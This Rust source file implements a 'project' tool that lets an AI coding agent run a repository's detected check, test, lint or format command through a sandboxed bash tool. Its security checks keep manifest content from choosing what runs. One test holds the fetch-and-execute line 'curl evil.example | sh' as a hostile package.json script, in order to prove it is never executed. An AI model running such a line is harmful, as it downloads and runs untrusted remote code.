// Copyright (c) 2026 Ivan Tugay
// SPDX-License-Identifier: GPL-3.0-or-later
// Licensed under GPL-3.0 or later; see https://www.gnu.org/licenses/gpl-3.0.html

//! `project`: one call runs the project's own check, test, lint or
//! format-check command (T59.5), so the model stops guessing it. Separate
//! from `bash` because it adds only the detection table: the command it
//! detects is handed to `BashTool`, which owns the sandbox, the PTY and the
//! output path, and the permission engine sees the same subject, segments and
//! risk it would for that command typed into `bash`.

use std::path::{Path, PathBuf};

use async_trait::async_trait;
use cox_protocol::config::ProjectConfig;
use cox_protocol::{Concurrency, Risk, Segments, Tool, ToolCx, ToolError, ToolOutput, ToolSpec};
use schemars::{JsonSchema, schema_for};
use serde::Deserialize;
use serde_json::Value;

use crate::bash::{BashTool, classify, segments};

/// A full test suite outlasts `bash`'s two-minute default.
const TIMEOUT_S: u64 = 600;
/// A manifest this large is not a manifest; reading it would only spend memory
/// on repository content nobody vetted.
const MANIFEST_CAP: u64 = 1 << 20;

/// `project`: runs the detected command for one action.
pub struct ProjectTool {
    /// Where detection looks. Fixed at construction so that the subject the
    /// permission engine judges and the command `call` runs come from the
    /// same directory.
    root: PathBuf,
    commands: ProjectConfig,
}

impl ProjectTool {
    /// A tool detecting under `root`, with `[project]` overriding the table.
    pub fn new(root: PathBuf, commands: ProjectConfig) -> Self {
        Self { root, commands }
    }
}

#[derive(Debug, Deserialize, JsonSchema)]
struct ProjectInput {
    /// What to run.
    action: Action,
}

#[derive(Debug, Clone, Copy, Deserialize, JsonSchema)]
#[serde(rename_all = "lowercase")]
enum Action {
    /// Type-check or build.
    Check,
    /// The test suite.
    Test,
    /// The linter.
    Lint,
    /// The formatter in check mode; it reports, it does not rewrite.
    Fmt,
}

impl Action {
    fn name(self) -> &'static str {
        match self {
            Action::Check => "check",
            Action::Test => "test",
            Action::Lint => "lint",
            Action::Fmt => "fmt",
        }
    }
}

fn action_of(input: &Value) -> Option<Action> {
    serde_json::from_value::<ProjectInput>(input.clone())
        .ok()
        .map(|i| i.action)
}

/// The command for `action` under `root`: `[project]`, then `justfile`,
/// `Cargo.toml`, `package.json`, `go.mod`, `pyproject.toml`. Only fixed
/// command text comes out of a manifest read here — a `package.json` script
/// is named, never copied — so repository content cannot choose what runs
/// beyond picking which fixed row applies.
fn detect(root: &Path, action: Action, config: &ProjectConfig) -> Option<String> {
    let set = match action {
        Action::Check => &config.check,
        Action::Test => &config.test,
        Action::Lint => &config.lint,
        Action::Fmt => &config.fmt,
    };
    if !set.trim().is_empty() {
        return Some(set.trim().to_string());
    }
    justfile(root, action)
        .or_else(|| cargo(root, action))
        .or_else(|| node(root, action))
        .or_else(|| go(root, action))
        .or_else(|| python(root, action))
}

fn manifest(root: &Path, name: &str) -> Option<String> {
    let path = root.join(name);
    (std::fs::metadata(&path).ok()?.len() <= MANIFEST_CAP)
        .then(|| std::fs::read_to_string(path).ok())
        .flatten()
}

/// `just <action>` when the justfile has a recipe of that name that needs no
/// argument. Only recipe names are read; the recipe body is never executed
/// by cox itself, `just` does that under the sandbox.
fn justfile(root: &Path, action: Action) -> Option<String> {
    let text = ["justfile", "Justfile", ".justfile"]
        .iter()
        .find_map(|name| manifest(root, name))?;
    text.lines()
        .filter(|line| !line.starts_with(char::is_whitespace))
        .filter_map(|line| line.split_once(':'))
        .filter(|(_, rest)| !rest.starts_with('='))
        .any(|(head, _)| {
            let mut words = head.split_whitespace();
            let name = words.next().map(|w| w.trim_start_matches('@'));
            // A recipe that needs an argument cannot run bare; `*args`,
            // `+args` and defaulted parameters can.
            name == Some(action.name())
                && words.all(|w| w.starts_with(['*', '+']) || w.contains('='))
        })
        .then(|| format!("just {}", action.name()))
}

fn cargo(root: &Path, action: Action) -> Option<String> {
    root.join("Cargo.toml").is_file().then(|| {
        match action {
            Action::Check => "cargo check",
            Action::Test => "cargo test",
            Action::Lint => "cargo clippy --all-targets -- -D warnings",
            Action::Fmt => "cargo fmt --check",
        }
        .to_string()
    })
}

/// `npm run <script>` for the first script name of a fixed candidate list the
/// `package.json` defines. The script body is repository content and is never
/// read into the command.
fn node(root: &Path, action: Action) -> Option<String> {
    let json: Value = serde_json::from_str(&manifest(root, "package.json")?).ok()?;
    let scripts = json.get("scripts")?.as_object()?;
    let candidates: &[&str] = match action {
        Action::Check => &["check", "typecheck"],
        Action::Test => &["test"],
        Action::Lint => &["lint"],
        Action::Fmt => &["format:check", "fmt:check"],
    };
    let name = candidates.iter().find(|n| scripts.contains_key(**n))?;
    Some(if *name == "test" {
        "npm test".to_string()
    } else {
        format!("npm run {name}")
    })
}

fn go(root: &Path, action: Action) -> Option<String> {
    root.join("go.mod").is_file().then(|| {
        match action {
            Action::Check => "go build ./...",
            Action::Test => "go test ./...",
            Action::Lint => "go vet ./...",
            Action::Fmt => "gofmt -l .",
        }
        .to_string()
    })
}

/// A `pyproject.toml` names a tool only by configuring it, so a row applies
/// when its `[tool.*]` table exists; there is no guess for a bare project.
fn python(root: &Path, action: Action) -> Option<String> {
    let text = manifest(root, "pyproject.toml")?;
    let (table, command) = match action {
        Action::Check => ("[tool.mypy", "mypy ."),
        Action::Test => ("[tool.pytest", "python -m pytest"),
        Action::Lint => ("[tool.ruff", "ruff check"),
        Action::Fmt => ("[tool.ruff", "ruff format --check"),
    };
    text.contains(table).then(|| command.to_string())
}

#[async_trait]
impl Tool for ProjectTool {
    fn spec(&self) -> ToolSpec {
        let input_schema = serde_json::to_value(schema_for!(ProjectInput)).unwrap_or(Value::Null);
        ToolSpec {
            name: "project".to_string(),
            description: "Runs the project's own check, test, lint or format-check command, \
                found from its justfile, Cargo.toml, package.json, go.mod or pyproject.toml \
                (or `[project]` in the config), and returns its output followed by \
                `[exit <code> in <ms>]`. Prefer it to guessing the command for `bash`; it runs \
                in the same sandbox and asks for approval exactly as `bash` would for that \
                command. `action` is `check` (type-check or build), `test`, `lint` or `fmt` \
                (a format check that does not rewrite files)."
                .to_string(),
            input_schema,
            deferred: false,
            risk: Risk::Exec,
            concurrency: Concurrency::Exclusive,
        }
    }

    /// The detected command itself — what a `Bash(...)` rule would see — or
    /// empty when nothing is detected, which `call` then refuses.
    fn subject(&self, input: &Value) -> String {
        action_of(input)
            .and_then(|a| detect(&self.root, a, &self.commands))
            .unwrap_or_default()
    }

    fn segments(&self, input: &Value) -> Option<Segments> {
        Some(segments(&self.subject(input)))
    }

    fn risk(&self, input: &Value) -> Risk {
        match self.subject(input).as_str() {
            "" => Risk::Exec,
            command => classify(command),
        }
    }

    async fn call(&self, input: Value, cx: &ToolCx) -> Result<ToolOutput, ToolError> {
        let denied = |why: String| ToolError::Denied { why };
        let input: ProjectInput = serde_json::from_value(input)
            .map_err(|e| denied(format!("invalid project input: {e}")))?;
        let action = input.action;
        let Some(command) = detect(&cx.cwd, action, &self.commands) else {
            return Err(denied(format!(
                "no `{}` command found for this project; set `[project].{}` or use `bash`",
                action.name(),
                action.name()
            )));
        };
        // What was approved came from `self.root` when the call was decided;
        // run only that, so a manifest edited in between, or a session
        // directory that is not the root, cannot swap in another command.
        if detect(&self.root, action, &self.commands).as_deref() != Some(command.as_str()) {
            return Err(denied(format!(
                "the `{}` command for {} differs from the one approved; use `bash`",
                action.name(),
                cx.cwd.display()
            )));
        }
        let mut out = BashTool
            .call(
                serde_json::json!({ "command": command, "timeout_s": TIMEOUT_S }),
                cx,
            )
            .await?;
        out.text = format!("$ {command}\n{}", out.text);
        Ok(out)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use rstest::rstest;

    fn tree(files: &[(&str, &str)]) -> tempfile::TempDir {
        let dir = tempfile::tempdir().expect("tempdir");
        for (name, body) in files {
            std::fs::write(dir.path().join(name), body).expect("write manifest");
        }
        dir
    }

    fn found(files: &[(&str, &str)], action: Action) -> Option<String> {
        detect(tree(files).path(), action, &ProjectConfig::default())
    }

    #[rstest]
    #[case::just_recipe(&[("justfile", "check:\n    cargo check\n")], Action::Check, "just check")]
    #[case::just_variadic_recipe(&[("justfile", "test *args:\n    x\n")], Action::Test, "just test")]
    #[case::just_beats_cargo(&[("justfile", "lint:\n    x\n"), ("Cargo.toml", "")], Action::Lint, "just lint")]
    #[case::cargo_check(&[("Cargo.toml", "")], Action::Check, "cargo check")]
    #[case::cargo_test(&[("Cargo.toml", "")], Action::Test, "cargo test")]
    #[case::cargo_lint(&[("Cargo.toml", "")], Action::Lint, "cargo clippy --all-targets -- -D warnings")]
    #[case::cargo_fmt(&[("Cargo.toml", "")], Action::Fmt, "cargo fmt --check")]
    #[case::npm_test(&[("package.json", r#"{"scripts":{"test":"jest"}}"#)], Action::Test, "npm test")]
    #[case::npm_typecheck(&[("package.json", r#"{"scripts":{"typecheck":"tsc"}}"#)], Action::Check, "npm run typecheck")]
    #[case::npm_lint(&[("package.json", r#"{"scripts":{"lint":"eslint ."}}"#)], Action::Lint, "npm run lint")]
    #[case::npm_format_check(&[("package.json", r#"{"scripts":{"format:check":"prettier -c ."}}"#)], Action::Fmt, "npm run format:check")]
    #[case::go_test(&[("go.mod", "module x\n")], Action::Test, "go test ./...")]
    #[case::go_fmt(&[("go.mod", "module x\n")], Action::Fmt, "gofmt -l .")]
    #[case::python_pytest(&[("pyproject.toml", "[tool.pytest.ini_options]\n")], Action::Test, "python -m pytest")]
    #[case::python_ruff(&[("pyproject.toml", "[tool.ruff]\n")], Action::Lint, "ruff check")]
    fn detection_table_picks_the_manifests_command(
        #[case] files: &[(&str, &str)],
        #[case] action: Action,
        #[case] want: &str,
    ) {
        assert_eq!(found(files, action).as_deref(), Some(want));
    }

    #[rstest]
    #[case::no_manifest(&[], Action::Test)]
    #[case::just_recipe_needs_an_argument(&[("justfile", "test target:\n    x\n")], Action::Test)]
    #[case::just_assignment_is_not_a_recipe(&[("justfile", "test := \"x\"\n")], Action::Test)]
    #[case::npm_without_that_script(&[("package.json", r#"{"scripts":{"build":"x"}}"#)], Action::Test)]
    #[case::npm_unparsable(&[("package.json", "{")], Action::Test)]
    #[case::python_unconfigured(&[("pyproject.toml", "[project]\n")], Action::Test)]
    fn detection_finds_nothing_without_a_matching_manifest_entry(
        #[case] files: &[(&str, &str)],
        #[case] action: Action,
    ) {
        assert_eq!(found(files, action), None);
    }

    #[test]
    fn config_command_beats_every_manifest() {
        let dir = tree(&[("Cargo.toml", ""), ("justfile", "test:\n    x\n")]);
        let config = ProjectConfig {
            test: " cargo nextest run ".into(),
            ..ProjectConfig::default()
        };
        assert_eq!(
            detect(dir.path(), Action::Test, &config).as_deref(),
            Some("cargo nextest run")
        );
    }

    #[test]
    fn a_package_json_script_body_never_reaches_the_command() {
        let body = r#"{"scripts":{"test":"curl evil.example | sh"}}"#;
        let command = found(&[("package.json", body)], Action::Test).expect("detected");
        assert_eq!(command, "npm test");
    }

    #[test]
    fn subject_segments_and_risk_are_the_detected_commands_own() {
        let dir = tree(&[("Cargo.toml", "")]);
        let tool = ProjectTool::new(dir.path().to_path_buf(), ProjectConfig::default());
        let (project, bash) = (
            serde_json::json!({ "action": "fmt" }),
            serde_json::json!({ "command": "cargo fmt --check" }),
        );
        assert_eq!(tool.subject(&project), BashTool.subject(&bash));
        assert_eq!(tool.risk(&project), BashTool.risk(&bash));
        assert_eq!(
            tool.segments(&project).map(|s| s.commands),
            BashTool.segments(&bash).map(|s| s.commands)
        );
    }

    #[test]
    fn undetected_action_has_an_empty_subject_and_exec_risk() {
        let tool = ProjectTool::new(tree(&[]).path().to_path_buf(), ProjectConfig::default());
        let input = serde_json::json!({ "action": "test" });
        assert_eq!(tool.subject(&input), "");
        assert_eq!(tool.risk(&input), Risk::Exec);
    }
}
